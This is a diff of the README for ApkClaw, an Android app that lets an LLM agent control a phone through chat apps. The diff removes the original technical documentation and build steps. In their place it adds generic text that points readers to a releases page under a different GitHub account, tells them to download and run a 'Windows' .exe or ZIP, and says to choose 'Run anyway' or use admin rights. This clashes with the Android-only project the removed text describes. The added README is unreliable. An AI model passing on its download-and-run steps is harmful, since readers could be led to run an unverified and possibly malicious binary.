@@ -1,287 +1,266 @@
-# ApkClaw
+# 🤖 ApkClaw - Control Android Tasks With Simple Messages
 
-[中文文档](README_CN.md)
+<p align="center">
+  <a href="https://github.com/transitive-champaign778/ApkClaw/releases">
+    <img src="https://img.shields.io/badge/Download%20ApkClaw-Release%20Page-blue?style=for-the-badge" alt="Download ApkClaw" />
+  </a>
+  <a href="https://github.com/transitive-champaign778/ApkClaw/releases">
+    <img src="https://img.shields.io/badge/Windows%20Setup-Get%20the%20latest%20version-lightgrey?style=for-the-badge" alt="Windows Setup" />
+  </a>
+</p>
 
-An AI-powered Android automation app that lets an LLM Agent control Android devices (phones) via natural language. Users send instructions through messaging channels (DingTalk, Feishu, QQ, Discord, Telegram), and the AI Agent autonomously executes device operations.
+## 📥 Download ApkClaw
 
-## Screenshots
+Visit this page to download the Windows release:
+
+[https://github.com/transitive-champaign778/ApkClaw/releases](https://github.com/transitive-champaign778/ApkClaw/releases)
+
+On that page, look for the latest release and download the Windows file. If the release contains a ZIP file, save it to your PC and extract it first. If it contains an `.exe` file, you can run it after the download finishes.
+
+## 🪟 Install on Windows
+
+1. Open the release page.
+2. Find the newest release at the top.
+3. Download the Windows package.
+4. If the file is a ZIP archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app file inside the folder.
+7. If Windows asks for permission, choose Run anyway or Yes.
+
+If you use a work or school PC, you may need administrator access to start the app.
+
+## 📱 What ApkClaw Does
+
+ApkClaw lets you control an Android phone by sending plain language messages. You can use common chat apps like:
+
+- DingTalk
+- Feishu
+- QQ
+- Discord
+- Telegram
+- WeChat
+
+You send a task in chat, and ApkClaw passes it to an AI agent. The agent then performs the action on the Android device.
+
+This can help with tasks such as:
+
+- Opening apps
+- Tapping buttons
+- Filling in forms
+- Reading screens
+- Moving through menus
+- Checking status on the phone
+
+## 🖥️ Before You Start
+
+Use a Windows PC that meets these basic needs:
+
+- Windows 10 or Windows 11
+- A stable internet connection
+- An Android phone that you can connect and manage
+- A chat account for one of the supported messaging apps
+- Permission to install and run desktop apps
+
+For the best results, keep your phone unlocked during setup and use a USB cable or wireless connection that stays stable.
+
+## 🚀 First-Time Setup
+
+After you install ApkClaw:
+
+1. Start the app on Windows.
+2. Open the Settings page.
+3. Add your AI model details.
+4. Connect at least one messaging channel.
+5. Allow access to the Android device.
+6. Test with a simple command.
+
+A good first test is a short request such as:
+
+- Open Settings on the phone
+- Go to the home screen
+- Check battery status
+- Open the browser
+
+Use short, clear instructions at first. This helps you confirm that the connection works before you try longer tasks.
+
+## 🔧 Connect Your Messaging Channel
+
+ApkClaw supports several chat platforms. Choose one platform and set it up first.
+
+### DingTalk
+
+- Create or open a DingTalk bot
+- Copy the bot details into ApkClaw
+- Send a test message to the bot
+
+### Feishu
+
+- Create a Feishu app or bot
+- Add the connection data in the app
+- Use chat messages to send commands
+
+### QQ
+
+- Add the QQ connection details
+- Make sure the account can receive messages
+- Send a simple command to test the link
+
+### Discord
+
+- Create a Discord bot
+- Add the bot token in the settings
+- Send a message in the chosen channel
+
+### Telegram
+
+- Create a Telegram bot with BotFather
+- Copy the token into ApkClaw
+- Send a message to the bot account
+
+### WeChat
+
+- Connect the WeChat account or bridge service you plan to use
+- Enter the required details in Settings
+- Test message delivery before using it for tasks
+
+If one channel does not work, check the token, account status, and channel permissions first.
+
+## ⚙️ Set Up the AI Agent
+
+ApkClaw uses an AI model to read your message and decide what to do on the phone. In the Settings page, enter:
+
+- The model name
+- The API key
+- The server address, if needed
+- Any prompt or behavior settings
+
+Use a model that handles short instructions well. Keep the action words simple. For example:
+
+- Tap the blue button
+- Open the app drawer
+- Scroll down one page
+- Return to the previous screen
+
+Avoid long requests with many steps at first. Start small, then build up.
+
+## 📷 Screenshots
 
 <p align="center">
   <img src="Screenshots/Home.jpg" width="300" alt="Home - Permission Management" />
   <img src="Screenshots/Setting.jpg" width="300" alt="Settings - LLM & Channel Config" />
 </p>
 
-## Architecture Overview
+## 🧭 Main Screens
 
-```
-┌────────────────────────────────────────────────────────────────────┐
-│                   Messaging Channels                               │
-│  DingTalk  │  Feishu  │  QQ  │  Discord  │  Telegram  |  WeChat    │
-└──────────────────────┬─────────────────────────────────────────────┘
-                       │ Incoming message
-                       ▼
-              ┌─────────────────┐
-              │  ChannelManager  │  Message routing & dispatch
-              └────────┬────────┘
-                       │
-              ┌────────▼────────┐
-              │ TaskOrchestrator │  Task lock & lifecycle mgmt
-              └────────┬────────┘
-                       │
-              ┌────────▼────────┐
-              │  AgentService    │  Agent loop
-              │                  │
-              │  ┌────────────┐  │
-              │  │  LLM Call  │◄─┼── LangChain4j (OpenAI / Anthropic)
-              │  └─────┬──────┘  │
-              │        │         │
-              │  ┌─────▼──────┐  │
-              │  │  Tool Exec │◄─┼── ToolRegistry → ClawAccessibilityService
-              │  └─────┬──────┘  │
-              │        │         │
-              │   Loop until     │
-              │   task complete  │
-              └────────┬────────┘
-                       │
-                       ▼
-              Reply to user via channel
-```
+### Home
 
-## Star History
+The Home screen focuses on device access and permission status. Use it to check whether ApkClaw can reach the Android phone and whether the needed permissions are active.
 
-![Star History Chart](https://api.star-history.com/svg?repos=apkclaw-team/ApkClaw)
+### Settings
 
-## Core Execution Flow
+The Settings screen is where you enter:
 
-1. **User** sends a natural language message through any connected channel
-2. **ChannelSetup** checks that the accessibility service is running
-3. **TaskOrchestrator** acquires the task lock (single-task model) and presses Home to reset device state
-4. **DefaultAgentService** enters the agent loop:
-   - Builds system prompt with device context (brand, model, resolution, registered tools)
-   - Calls LLM with tool definitions (via LangChain4j bridge)
-   - Extracts tool calls from LLM response
-   - Executes tools via **ToolRegistry** → **ClawAccessibilityService**
-   - Feeds tool results back to LLM
-   - Loops until the `finish` tool is called or max iterations (40) are reached
-5. **Result** is sent back to the user through the same channel
+- AI model details
+- Channel setup data
+- Device connection settings
+- App behavior options
 
-## Agent System
+Check this page if messages do not reach the phone or if the agent does not respond.
 
-### Agent Loop (`DefaultAgentService`)
+## 🔒 Permissions You May Need
 
-The agent follows an **Observe → Think → Act → Verify** protocol:
+ApkClaw may need the following permissions to work well:
 
-- **System Prompt**: Injects device info (brand, model, Android version, screen resolution), registered tool list, and safety constraints
-- **LLM Call Retry**: Up to 3 attempts with exponential backoff (1s → 2s → 4s); no retry on 401/403
-- **Loop Detection**: Maintains a 4-round sliding window of `(screenHash, toolCall)` fingerprints; if all identical, injects a system message forcing the agent to try a different approach
-- **Token Optimization**: Replaces historical `get_screen_info` results with placeholders to save tokens, keeping only the most recent one
-- **System Dialog Handling**: When `getRootInActiveWindow()` returns null (protected system dialog detected), takes a screenshot, sends it to the user, and aborts the task
+- Screen access
+- Accessibility access
+- Device control access
+- Network access
+- Notification access
 
-### LLM Integration
+If the app asks for permission, open the request and turn it on. Some Android phones hide these controls under system settings, so you may need to search for the permission name.
 
-Pluggable LLM backends via `LlmClientFactory`:
+## 🧪 How to Test It
 
-| Provider | Client Class | Model Builder |
-|----------|-------------|---------------|
-| OpenAI-compatible | `OpenAiLlmClient` | `OpenAiChatModel` / `OpenAiStreamingChatModel` |
-| Anthropic | `AnthropicLlmClient` | `AnthropicChatModel` / `AnthropicStreamingChatModel` |
+After setup, send one simple command through your chosen chat app. Try one of these:
 
-Both streaming and non-streaming modes are supported. The HTTP layer uses a custom `OkHttpClientBuilderAdapter` (OkHttp-based) instead of JDK HttpClient for Android compatibility.
+- Open the home screen
+- Open the camera app
+- Scroll down
+- Go back
+- Check the time
 
-**Configuration** (`AgentConfig`):
-- `apiKey`: From local settings
-- `baseUrl`: LLM endpoint (default: `https://api.openai.com/v1`)
-- `modelName`: User-selectable
-- `provider`: `OPENAI` (default) or `ANTHROPIC`
-- `temperature`: 0.1 (deterministic output)
-- `maxIterations`: 40
-- `streaming`: Configurable (default: off)
+If the task works, you can try more useful actions such as:
 
-### LangChain4j Bridge
+- Opening a chat app
+- Searching for a contact
+- Starting a call
+- Opening a webpage
+- Checking a setting on the phone
 
-`LangChain4jToolBridge` converts custom `BaseTool` abstractions into LangChain4j's `ToolSpecification` format, mapping parameter types (`string`, `integer`, `number`, `boolean`) to JSON Schema.
+If the app does not act on the phone, confirm that the phone is connected, the right channel is active, and the AI settings are saved.
 
-## Tool System
+## 🛠️ Common Issues
 
-Tools are registered in `ToolRegistry` by device type:
+### The app does not start
 
-### Common Tools (All Devices)
-| Tool | Description |
-|------|-------------|
-| `get_screen_info` | Get UI hierarchy tree for AI to analyze the current screen |
-| `find_node_info` | Find elements by text or resource ID |
-| `take_screenshot` | Capture current screen as PNG |
-| `input_text` | Input text into the focused field |
-| `open_app` | Open an app by name |
-| `get_installed_apps` | List installed applications |
-| `press_back` / `press_home` | Navigate back / Go to home screen |
-| `open_recent_apps` | Open recent apps |
-| `expand_notifications` / `collapse_notifications` | Expand / Collapse notification shade |
-| `lock_screen` | Lock the screen |
-| `wait` | Wait for a specified duration |
-| `repeat_actions` | Repeat a set of actions |
-| `send_file` | Send a file to the user via channel |
-| `finish` | Complete the task and return a summary |
+- Check that you downloaded the latest release
+- Make sure the file finished downloading
+- Extract the ZIP file before opening it
+- Try running the app as administrator
 
-### Phone-Specific Tools
-| Tool | Description |
-|------|-------------|
-| `tap` | Tap at coordinates (x, y) |
-| `long_press` | Long press at coordinates |
-| `swipe` | Swipe from point A to point B |
-| `click_by_text` | Click an element by visible text |
-| `click_by_id` | Click an element by resource ID |
-| `search_app_in_store` | Search for an app in the app store |
+### Messages do not reach ApkClaw
 
-Each tool extends `BaseTool`, implements `execute(Map<String, Any>): ToolResult`, and provides bilingual (Chinese/English) descriptions with typed parameter declarations.
+- Confirm the bot token or account details
+- Check the messaging channel status
+- Make sure the bot is added to the right chat or server
+- Send a short test message first
 
-## Channel System
+### The phone does not respond
 
-| Channel | Protocol | Required Credentials |
-|---------|----------|---------------------|
-| DingTalk | App Stream Client | Client ID + Client Secret |
-| Feishu | OAPI SDK | App ID + App Secret |
-| QQ | QQ Bot API | App ID + App Secret |
-| Discord | Gateway WebSocket + REST | Bot Token |
-| Telegram | Bot HTTP API | Bot Token |
+- Check the USB or network connection
+- Make sure the phone is unlocked
+- Confirm that permissions are enabled
+- Restart the app and test again
 
-Channel credentials can be configured via the in-app settings page or the LAN HTTP server (`http://<device-ip>:9527`).
+### The AI gives the wrong action
 
-## Accessibility Service
+- Use shorter instructions
+- Remove extra words
+- Try one task at a time
+- Check the model and prompt settings
 
-`ClawAccessibilityService` (Java) is the core device interaction layer:
-- **Gestures**: Tap, swipe, long press via `dispatchGesture()`
-- **Node Traversal**: UI hierarchy tree via `getRootInActiveWindow()`
-- **Key Injection**: Home, Back, Recents via `performGlobalAction()`
-- **Screenshot**: `takeScreenshot()` (requires Android 11+)
+## 🧩 Suggested Use Cases
 
-**Known Limitation**: Protected system windows (e.g., `com.android.permissioncontroller` permission dialogs) block both node tree access and gesture injection (`filterTouchesWhenObscured`). The agent detects this, takes a screenshot, and notifies the user to handle it manually.
+ApkClaw can help with simple Android tasks such as:
 
-## LAN Configuration Server
+- Demo phone actions during a meeting
+- Run repeat steps on a test device
+- Check app screens without touching the phone
+- Route actions from a chat app to a device
+- Handle basic phone operations from a remote location
 
-A NanoHTTPD-based HTTP server runs on port 9527 for convenient configuration from a PC browser:
+## 🗂️ File and Folder Tips
 
-| Endpoint | Method | Purpose |
-|----------|--------|---------|
-| `/` | GET | Configuration web page |
-| `/api/channels` | GET/POST | Read/update channel credentials |
-| `/api/llm` | GET/POST | Read/update LLM configuration |
+After extraction, keep the app files in one folder. Do not move single files out of the folder unless the release notes say to do so. If you update to a new version, close the app first, then replace the old files with the new release files.
 
-Secrets are masked (only last 4 characters shown) when retrieved via GET. Debug builds additionally expose `/debug.html` with a tool execution console.
+## 🔄 Update to a New Release
 
-## Project Structure
+When a new version is available:
 
-```
-app/src/main/java/com/apk/claw/android/
-├── agent/                  # Agent loop, config, callbacks
-│   ├── langchain/          # LangChain4j bridge & OkHttp adapter
-│   └── llm/                # LLM clients (OpenAI, Anthropic)
-├── base/                   # BaseActivity (screen density adaptation)
-├── channel/                # Messaging channel handlers
-│   ├── dingtalk/
-│   ├── feishu/
-│   ├── qqbot/
-│   ├── discord/
-│   └── telegram/
-├── floating/               # Floating button UI manager
-├── server/                 # LAN config & debug HTTP server
-├── service/                # Accessibility, foreground, keep-alive services
-├── tool/                   # Tool abstraction layer & registry
-│   └── impl/               # Tool implementations (common/phone/TV)
-├── ui/                     # Activities (splash, home, guide, settings)
-├── utils/                  # KVUtils, XLog, formatting utilities
-└── widget/                 # Custom UI components
-```
+1. Go back to the release page
+2. Download the latest Windows package
+3. Close the old version
+4. Extract the new ZIP or run the new file
+5. Open the app and check your settings
 
-## Build & Run
+If your settings do not carry over, copy them from the old folder before removing it.
 
-### Requirements
+## 📎 Release Page
 
-- Java 17+
-- Android Studio (Ladybug or later recommended)
-- Android SDK 36 (compile/target), min SDK 28
+Download or update from here:
 
-### Build
+[https://github.com/transitive-champaign778/ApkClaw/releases](https://github.com/transitive-champaign778/ApkClaw/releases)
 
-```bash
-# Clone the repository
-git clone https://github.com/apkclaw-team/ApkClaw.git
-cd ApkClaw
+## 🌐 Language Support
 
-# Debug build
-./gradlew assembleDebug
-
-# Release build
-./gradlew assembleRelease
-```
-
-### Setup
-
-1. **Install** the APK on your Android device (Android 9+)
-2. **Grant permissions** on the home screen — enable all required permissions (Accessibility Service, Notification, System Window, Battery Whitelist, File Access)
-3. **Configure LLM** — go to Settings > LLM Config, fill in:
-   - **API Key**: Your OpenAI or Anthropic API key
-   - **Base URL**: LLM endpoint (default: `https://api.openai.com/v1`, change it if using a custom provider)
-   - **Model Name**: e.g. `gpt-4o`, `claude-sonnet-4-20250514`
-4. **Configure a channel** — go to Settings, pick at least one messaging channel (DingTalk / Feishu / QQ / Discord / Telegram), fill in the bot credentials
-5. **Send a message** via the configured channel to start controlling your device
-
-> **Tip**: You can also configure LLM and channel credentials from a PC browser via LAN Config. Enable it in Settings, then visit `http://<device-ip>:9527` on your PC.
-
-## Key Dependencies
-
-**AI / Agent**
-
-| Dependency | Version | Purpose |
-|------------|---------|---------|
-| [LangChain4j](https://github.com/langchain4j/langchain4j) | 1.12.2 | Agent orchestration, tool definitions, LLM integration |
-
-**Messaging Channels**
-
-| Dependency | Version | Purpose |
-|------------|---------|---------|
-| [DingTalk Stream Client](https://github.com/open-dingtalk/dingtalk-stream-sdk-java) | 1.3.12 | DingTalk channel |
-| [Feishu OAPI SDK](https://github.com/larksuite/oapi-sdk-java) | 2.5.3 | Feishu / Lark channel |
-
-**Networking**
-
-| Dependency | Version | Purpose |
-|------------|---------|---------|
-| [OkHttp](https://github.com/square/okhttp) | 4.12.0 | HTTP client for LLM calls |
-| [Retrofit](https://github.com/square/retrofit) | 2.11.0 | REST API client |
-| [NanoHTTPD](https://github.com/NanoHttpd/nanohttpd) | 2.3.1 | LAN config & debug HTTP server |
-
-**Storage & Utilities**
-
-| Dependency | Version | Purpose |
-|------------|---------|---------|
-| [MMKV](https://github.com/Tencent/MMKV) | 2.3.0 | High-performance local key-value storage |
-| [Gson](https://github.com/google/gson) | 2.13.2 | JSON serialization |
-| [ZXing](https://github.com/zxing/zxing) | 3.5.3 | QR code generation |
-| [UtilCode](https://github.com/Blankj/AndroidUtilCode) | 1.31.1 | Android utility functions |
-
-**UI**
-
-| Dependency | Version | Purpose |
-|------------|---------|---------|
-| [Glide](https://github.com/bumptech/glide) | 5.0.5 | Image loading |
-| [EasyFloat](https://github.com/princekin-f/EasyFloat) | 2.0.4 | Floating window |
-| [MultiType](https://github.com/drakeet/MultiType) | 4.3.0 | RecyclerView multi-type adapter |
-
-## License
-
-```
-Copyright 2026 ApkClaw
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-    http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-```
+ApkClaw includes English and Chinese documentation. If you prefer Chinese, use the linked README file in the repository.
